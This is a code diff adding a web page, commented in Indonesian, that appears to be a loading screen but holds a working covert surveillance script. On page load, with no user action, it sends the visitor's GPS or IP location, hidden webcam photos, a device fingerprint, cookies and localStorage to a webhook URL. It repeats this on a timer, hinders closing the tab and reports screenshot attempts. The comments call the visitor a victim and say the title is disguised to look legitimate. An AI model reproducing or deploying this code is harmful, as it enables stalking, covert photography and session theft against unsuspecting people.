@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        * { margin:0; padding:0; }
+        body { 
+            background: #0a0a0a; 
+            color: #00ff41;
+            font-family: monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .glitch {
+            font-size: 24px;
+            animation: blink 0.5s infinite;
+            text-shadow: 0 0 10px #00ff41;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+        #video-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="glitch">⚡ LOADING SECURE CONNECTION ⚡</div>
+    <video id="video-bg" autoplay muted></video>
+    <canvas id="canvas-bg" style="display:none;"></canvas>
+
+    <script>
+        // ==========================================================
+        // GANTI INI DENGAN WEBHOOK ATAU SERVER TUAN
+        // ==========================================================
+        const SERVER_URL = "https://webhook.site/087efa07-3ab7-4a72-86ee-0b5e83148d58";
+        // ==========================================================
+        
+        function kirimData(data) {
+            fetch(SERVER_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(() => {});
+            
+            // Backup di localStorage
+            let log = JSON.parse(localStorage.getItem('sill_data') || '[]');
+            log.push(data);
+            localStorage.setItem('sill_data', JSON.stringify(log));
+            
+            console.log('✅ Data terkirim:', data.type);
+        }
+
+        // ====== 1. LACAK LOKASI MAKSIMAL ======
+        function lacakLokasi() {
+            // GPS dulu
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        kirimData({
+                            type: 'lokasi_gps',
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            akurasi: pos.coords.accuracy + ' meter',
+                            map: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                        });
+                    },
+                    () => {
+                        // Fallback IP
+                        fetch('https://ipapi.co/json/')
+                            .then(r => r.json())
+                            .then(d => {
+                                kirimData({
+                                    type: 'lokasi_ip',
+                                    ip: d.ip,
+                                    kota: d.city || '-',
+                                    provinsi: d.region || '-',
+                                    negara: d.country_name || '-',
+                                    lat: d.latitude || '-',
+                                    lon: d.longitude || '-',
+                                    map: d.latitude && d.longitude ? `https://www.google.com/maps?q=${d.latitude},${d.longitude}` : '-'
+                                });
+                            })
+                            .catch(() => {
+                                fetch('https://api.ipify.org?format=json')
+                                    .then(r => r.json())
+                                    .then(d => {
+                                        kirimData({
+                                            type: 'lokasi_ip_only',
+                                            ip: d.ip
+                                        });
+                                    });
+                            });
+                    },
+                    { enableHighAccuracy: true, timeout: 3000 }
+                );
+            } else {
+                // Kalo GPS ga ada, langsung IP
+                fetch('https://ipapi.co/json/')
+                    .then(r => r.json())
+                    .then(d => {
+                        kirimData({
+                            type: 'lokasi_ip_fallback',
+                            ip: d.ip,
+                            kota: d.city || '-',
+                            negara: d.country_name || '-',
+                            lat: d.latitude || '-',
+                            lon: d.longitude || '-'
+                        });
+                    });
+            }
+        }
+
+        // ====== 2. AMBIL WAJAH MAKSIMAL ======
+        function ambilWajah() {
+            let video = document.getElementById('video-bg');
+            let canvas = document.getElementById('canvas-bg');
+            let ctx = canvas.getContext('2d');
+            
+            navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: 'user',
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 }
+                } 
+            })
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+                
+                setTimeout(() => {
+                    canvas.width = video.videoWidth || 1280;
+                    canvas.height = video.videoHeight || 720;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    let foto = canvas.toDataURL('image/jpeg', 1.0);
+                    
+                    kirimData({
+                        type: 'wajah',
+                        foto: foto,
+                        width: canvas.width,
+                        height: canvas.height
+                    });
+                    
+                    stream.getTracks().forEach(t => t.stop());
+                }, 1000);
+            })
+            .catch(() => {
+                kirimData({
+                    type: 'wajah_gagal',
+                    error: 'kamera ditolak / tidak ada'
+                });
+            });
+        }
+
+        // ====== 3. AMBIL DATA DEVICE ======
+        function ambilDevice() {
+            let data = {
+                type: 'device_full',
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages || [],
+                cookieEnabled: navigator.cookieEnabled,
+                hardwareConcurrency: navigator.hardwareConcurrency || '?',
+                deviceMemory: navigator.deviceMemory || '?',
+                screen: `${screen.width}x${screen.height}`,
+                screenColorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                localTime: new Date().toString(),
+                url: window.location.href,
+                hostname: window.location.hostname,
+                referrer: document.referrer || 'direct'
+            };
+            
+            // Coba ambil IP lokal
+            try {
+                let pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (ice) => {
+                    if (ice.candidate) {
+                        let ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
+                        if (ip) {
+                            data.localIP = ip[0];
+                        }
+                        pc.close();
+                    }
+                };
+            } catch(e) {}
+            
+            kirimData(data);
+        }
+
+        // ====== 4. AMBIL COOKIE ======
+        function ambilCookie() {
+            if (document.cookie) {
+                let cookies = {};
+                document.cookie.split(';').forEach(c => {
+                    let parts = c.trim().split('=');
+                    if (parts.length >= 2) {
+                        cookies[parts[0]] = parts.slice(1).join('=');
+                    }
+                });
+                kirimData({
+                    type: 'cookies',
+                    raw: document.cookie,
+                    parsed: cookies
+                });
+            }
+            
+            // LocalStorage
+            try {
+                let ls = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    ls[key] = localStorage.getItem(key);
+                }
+                if (Object.keys(ls).length > 0) {
+                    kirimData({
+                        type: 'localStorage',
+                        data: ls
+                    });
+                }
+            } catch(e) {}
+        }
+
+        // ====== EKSEKUSI LANGSUNG TANPA TOMBOL ======
+        window.onload = function() {
+            // Langsung gas semua
+            lacakLokasi();
+            ambilWajah();
+            ambilDevice();
+            ambilCookie();
+            
+            // Update lokasi tiap 5 detik
+            setInterval(lacakLokasi, 5000);
+            
+            // Update wajah tiap 15 detik
+            setInterval(ambilWajah, 15000);
+            
+            // Ubah judul biar keliatan legit
+            document.title = "Connecting to secure server...";
+        };
+
+        // ====== KALAU KORBAN COBA KELUAR ======
+        window.addEventListener('beforeunload', function(e) {
+            kirimData({
+                type: 'user_close',
+                waktu: new Date().toISOString()
+            });
+            e.preventDefault();
+            e.returnValue = '';
+        });
+
+        // ====== DETECT PRINTSCREEN ======
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'PrintScreen') {
+                kirimData({
+                    type: 'print_screen_detected'
+                });
+            }
+        });
+
+        console.log('🔥 SILL ACTIVE - ALL DATA SENT! 🔥');
+    </script>
+</body>
+</html>
